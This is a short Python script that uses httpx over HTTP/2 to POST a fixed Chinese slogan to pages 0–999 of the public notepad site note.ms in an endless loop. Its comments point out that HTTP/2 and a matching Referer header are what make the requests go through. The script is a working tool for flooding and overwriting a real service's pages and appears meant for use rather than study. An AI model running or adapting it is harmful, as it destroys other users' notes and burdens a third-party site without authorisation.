import httpx
client=httpx.Client(http2=True) #重点：要用HTTP2
website="https://note.ms/"
i=0
while True:
    while i<1000:
        form={"t":"走出大山，走进深山"}
        header={"Referer":website+str(i)} #另一个重点：一样的Referer
        client.post(website+str(i),data=form,headers=header)
        print(i)
        i=i+1
    i=0